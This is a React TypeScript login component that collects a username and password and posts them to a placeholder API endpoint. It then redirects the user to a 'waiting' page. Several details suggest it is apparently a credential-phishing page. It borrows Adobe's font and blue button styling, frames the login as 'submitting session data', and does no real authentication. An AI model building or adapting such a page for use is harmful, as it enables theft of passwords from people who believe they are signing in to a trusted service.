import React, { useState, FormEvent } from 'react';
import { useNavigate } from 'react-router-dom';

const LoginPage: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const navigate = useNavigate();

  const handleLogin = async (event: FormEvent) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');

    const endpoint = 'https://api.example.com/v1/auth/session';

    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username,
          password: password,
          source: 'VitePortal'
        }),
      });

      if (response.ok) {
        // On success, redirect the user to the waiting page
        navigate('/waiting');
      } else {
        // Handle potential network errors
        setErrorMessage('Failed to submit session data. Please try again.');
        setIsLoading(false);
      }
    } catch (error) {
      console.error('An error occurred:', error);
      setErrorMessage('An error occurred. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      backgroundColor: '#f5f5f5',
      fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif'
    }}>
      <div style={{
        backgroundColor: '#fff',
        padding: '40px',
        borderRadius: '8px',
        boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
        width: '100%',
        maxWidth: '400px'
      }}>
        <h1 style={{
          fontSize: '24px',
          fontWeight: 'bold',
          marginBottom: '24px',
          textAlign: 'center',
          color: '#2c2c2c'
        }}>
          Sign In
        </h1>
        
        <form onSubmit={handleLogin}>
          <div style={{ marginBottom: '20px' }}>
            <label htmlFor="username" style={{
              display: 'block',
              marginBottom: '8px',
              fontSize: '14px',
              color: '#2c2c2c'
            }}>
              Email or Username
            </label>
            <input
              id="username"
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              disabled={isLoading}
              style={{
                width: '100%',
                padding: '12px',
                fontSize: '14px',
                border: '1px solid #d3d3d3',
                borderRadius: '4px',
                boxSizing: 'border-box'
              }}
            />
          </div>

          <div style={{ marginBottom: '24px' }}>
            <label htmlFor="password" style={{
              display: 'block',
              marginBottom: '8px',
              fontSize: '14px',
              color: '#2c2c2c'
            }}>
              Password
            </label>
            <input
              id="password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              disabled={isLoading}
              style={{
                width: '100%',
                padding: '12px',
                fontSize: '14px',
                border: '1px solid #d3d3d3',
                borderRadius: '4px',
                boxSizing: 'border-box'
              }}
            />
          </div>

          {errorMessage && (
            <div style={{
              padding: '12px',
              marginBottom: '16px',
              backgroundColor: '#fef0f0',
              color: '#d13838',
              borderRadius: '4px',
              fontSize: '14px'
            }}>
              {errorMessage}
            </div>
          )}

          <button
            type="submit"
            disabled={isLoading}
            style={{
              width: '100%',
              padding: '12px',
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#fff',
              backgroundColor: isLoading ? '#909090' : '#1473e6',
              border: 'none',
              borderRadius: '4px',
              cursor: isLoading ? 'not-allowed' : 'pointer',
              transition: 'background-color 0.2s'
            }}
          >
            {isLoading ? 'Submitting...' : 'Submit'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default LoginPage;
